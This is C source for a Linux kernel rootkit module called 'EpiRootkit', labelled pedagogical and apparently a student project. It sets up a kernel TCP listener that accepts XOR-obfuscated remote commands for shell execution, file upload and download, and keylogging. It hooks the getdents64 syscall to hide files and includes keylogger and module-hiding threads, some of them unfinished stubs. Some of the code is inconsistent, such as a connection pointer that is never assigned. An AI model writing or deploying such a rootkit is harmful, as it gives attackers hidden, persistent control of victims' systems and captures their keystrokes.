#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/cred.h>
#include <linux/input.h>
#include <linux/spinlock.h>
#include <linux/ctype.h>
#include <linux/jiffies.h>
#include <linux/delay.h>
#include <linux/inet.h>
#include <linux/list.h>
#include "epirootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.1");

// Global variables
struct rootkit_config config = {
    .port = 4242,
    .server_ip = "127.0.0.1",
    .buffer_size = 4096,
    .xor_key = "epita",
    .temp_output_file = "/tmp/rootkit_output",
    .command_prefix_auth = "AUTH",
    .command_prefix_exec = "EXEC",
    .command_prefix_upload = "UPLOAD",
    .command_prefix_download = "DOWNLOAD",
    .command_prefix_keylog = "KEYLOG",
    .command_prefix_length = 4,
    .shell_path = "/bin/sh",
    .shell_args = "-c",
    .path_env = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    .hidden_dir = ".hidden",
    .max_hidden_lines = 100,
    .command_prefix_hide_line = "HIDE",
    .command_prefix_unhide_line = "UNHIDE"
};

struct keylog_config keylog_config = {
    .buffer_size = 1024,
    .flush_interval = HZ * 5  // 5 seconds
};

struct memory_manager mem_manager = {
    .nonpaged_memory = NULL,
    .nonpaged_size = 0,
    .lock = __SPIN_LOCK_UNLOCKED(mem_manager.lock)
};

struct network_manager net_manager = {
    .connection = NULL,
    .is_connected = false,
    .lock = __SPIN_LOCK_UNLOCKED(net_manager.lock),
    .thread = NULL
};

struct list_head dkom_entries = LIST_HEAD_INIT(dkom_entries);
struct list_head hook_entries = LIST_HEAD_INIT(hook_entries);
DEFINE_SPINLOCK(hook_lock);
DEFINE_SPINLOCK(dkom_lock);

struct task_struct *g_stealth_thread = NULL;
unsigned long *sys_call_table = NULL;
asmlinkage long (*original_getdents64)(const struct pt_regs *) = NULL;
asmlinkage long (*original_read)(const struct pt_regs *) = NULL;
asmlinkage long (*original_write)(const struct pt_regs *) = NULL;

static struct socket *g_connection_socket = NULL;
static struct task_struct *g_rootkit_thread = NULL;
static struct task_struct *g_keylog_thread = NULL;
static bool g_is_authenticated = false;
static char g_password[256] = "epita";
static struct list_head *g_prev_module = NULL;
static struct keylog_buffer *g_keylog_buffer = NULL;

char keylog_buffer[KEYLOG_BUFFER_SIZE];
int keylog_buffer_index = 0;
struct list_head module_list;
bool module_hidden = false;

static void exec_and_send_output(const char *command) {
    struct file *output_file;
    char *output_buffer;
    int read_result;
    mm_segment_t old_fs;
    loff_t pos = 0;

    output_file = filp_open(config.temp_output_file, O_RDONLY, 0);
    if (IS_ERR(output_file)) {
        send_error(ROOTKIT_ERROR_FILE, "Failed to open output file");
        return;
    }

    output_buffer = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!output_buffer) {
        filp_close(output_file, NULL);
        send_error(ROOTKIT_ERROR_MEMORY, "Failed to allocate output buffer");
        return;
    }

    memset(output_buffer, 0, config.buffer_size);
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    read_result = kernel_read(output_file, pos, output_buffer, config.buffer_size - 1);
    set_fs(old_fs);

    if (read_result < 0) {
        kfree(output_buffer);
        filp_close(output_file, NULL);
        send_error(ROOTKIT_ERROR_FILE, "Failed to read output file");
        return;
    }

    if (read_result > 0) {
        output_buffer[read_result] = '\0';
        send_data(output_buffer);
    } else {
        send_data("Command executed with no output.\n");
    }

    filp_close(output_file, NULL);
    kfree(output_buffer);
}

static int rootkit_thread(void *data) {
    char *recv_buf;
    struct kvec iov;
    struct msghdr msg = { .msg_flags = 0 };
    int len;

    recv_buf = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!recv_buf)
        return -ENOMEM;

    while (!kthread_should_stop()) {
        memset(recv_buf, 0, config.buffer_size);
        iov.iov_base = recv_buf;
        iov.iov_len = config.buffer_size - 1;

        len = kernel_recvmsg(net_manager.connection, &msg, &iov, 1,
                             config.buffer_size - 1, 0);
        if (len <= 0)
            break;

        apply_xor_cipher(recv_buf, len);
        recv_buf[len] = '\0';
        process_command(recv_buf);
        msleep(100);
    }

    kfree(recv_buf);
    return 0;
}

static int connect_to_server(void) {
    struct sockaddr_in addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
                           &g_connection_socket);
    if (ret < 0)
        return ret;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(config.port);
    addr.sin_addr.s_addr = in_aton(config.server_ip);

    return g_connection_socket->ops->connect(g_connection_socket,
                                             (struct sockaddr *)&addr,
                                             sizeof(addr), 0);
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long ret = original_getdents64(regs);
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    dir = kdirent;
    while (off < ret) {
        if (strstr(dir->d_name, config.hidden_dir)) {
            if (prev) {
                prev->d_reclen += dir->d_reclen;
                memmove(dir, (char *)dir + dir->d_reclen, ret - off - dir->d_reclen);
                ret -= dir->d_reclen;
            } else {
                memmove(dir, (char *)dir + dir->d_reclen, ret - off - dir->d_reclen);
                ret -= dir->d_reclen;
            }
        } else {
            prev = dir;
            off += dir->d_reclen;
            dir = (void *)dir + dir->d_reclen;
        }
    }

    if (copy_to_user(dirent, kdirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    kfree(kdirent);
    return ret;
}

static int listen_for_connections(void) {
    struct sockaddr_in addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
                          &g_connection_socket);
    if (ret < 0) {
        printk(KERN_ERR "EpiRootkit: Failed to create socket\n");
        return ret;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(config.port);
    addr.sin_addr.s_addr = INADDR_ANY;

    ret = kernel_bind(g_connection_socket, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        printk(KERN_ERR "EpiRootkit: Failed to bind socket\n");
        sock_release(g_connection_socket);
        return ret;
    }

    ret = kernel_listen(g_connection_socket, 1);
    if (ret < 0) {
        printk(KERN_ERR "EpiRootkit: Failed to start listening\n");
        sock_release(g_connection_socket);
        return ret;
    }

    printk(KERN_INFO "EpiRootkit: Listening on port %d\n", config.port);
    return 0;
}

// Module initialization
static int __init epirootkit_init(void) {
    int ret;

    printk(KERN_INFO "EpiRootkit: Initializing...\n");

    ret = listen_for_connections();
    if (ret < 0) {
        printk(KERN_ERR "EpiRootkit: Failed to initialize network\n");
        return ret;
    }

    g_rootkit_thread = kthread_run(rootkit_thread, NULL, "epirootkit");
    if (IS_ERR(g_rootkit_thread)) {
        printk(KERN_ERR "EpiRootkit: Failed to create rootkit thread\n");
        sock_release(g_connection_socket);
        return PTR_ERR(g_rootkit_thread);
    }

    printk(KERN_INFO "EpiRootkit: Module loaded successfully\n");
    return 0;
}

// Module cleanup
static void __exit epirootkit_exit(void) {
    struct dkom_entry *entry, *tmp;
    unsigned long flags;
    
    printk(KERN_INFO "EpiRootkit: Cleaning up...\n");
    
    // Clean up DKOM entries
    spin_lock_irqsave(&hook_lock, flags);
    list_for_each_entry_safe(entry, tmp, &module_list, list) {
        dkom_restore_object(entry);
    }
    spin_unlock_irqrestore(&hook_lock, flags);
    
    // Free non-paged memory
    if (mem_manager.nonpaged_memory) {
        free_secure_memory(mem_manager.nonpaged_memory, mem_manager.nonpaged_size);
        mem_manager.nonpaged_memory = NULL;
    }
    
    printk(KERN_INFO "EpiRootkit: Cleanup complete\n");
}

// Hook management
void remove_hook(struct hook_entry *entry) {
    if (!entry) return;
    
    // Restore original function
    if (entry->original) {
        *(void **)entry->target = entry->original;
    }
    
    // Remove from list
    list_del(&entry->list);
    kfree(entry);
}

// DKOM functions
void dkom_restore_object(struct dkom_entry *entry) {
    if (!entry) return;
    
    // Restore original object
    if (entry->original) {
        memcpy(entry->target, entry->original, entry->size);
    }
    
    // Remove from list
    list_del(&entry->list);
    kfree(entry);
}

// Keylogger functions
void keylog_buffer_cleanup(void) {
    // Clear keylog buffer
    memset(keylog_buffer, 0, KEYLOG_BUFFER_SIZE);
    keylog_buffer_index = 0;
}

void send_keylog_data(void) {
    // Implementation will be added later
    printk(KERN_INFO "Sending keylog data...\n");
}

// Module hiding
void hide_module(void) {
    // Implementation will be added later
    printk(KERN_INFO "Hiding module...\n");
    module_hidden = true;
}

void unhide_module(void) {
    // Remove module from hidden list
    list_del(&module_list);
    module_hidden = false;
}

// Memory management
void free_secure_memory(void *ptr, size_t size) {
    if (!ptr) return;
    
    // Securely wipe memory before freeing
    memset(ptr, 0, size);
    kfree(ptr);
}

// Thread functions
int stealth_thread(void *data) {
    while (!kthread_should_stop()) {
        // Check if module is still hidden
        if (!module_hidden) {
            hide_module();
        }
        
        // Sleep for a while
        msleep(1000);
    }
    return 0;
}

int keylog_thread(void *data) {
    while (!kthread_should_stop()) {
        // Process keylog buffer
        if (keylog_buffer_index > 0) {
            // Send keylog data
            send_keylog_data();
            keylog_buffer_cleanup();
        }
        
        // Sleep for a while
        msleep(100);
    }
    return 0;
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);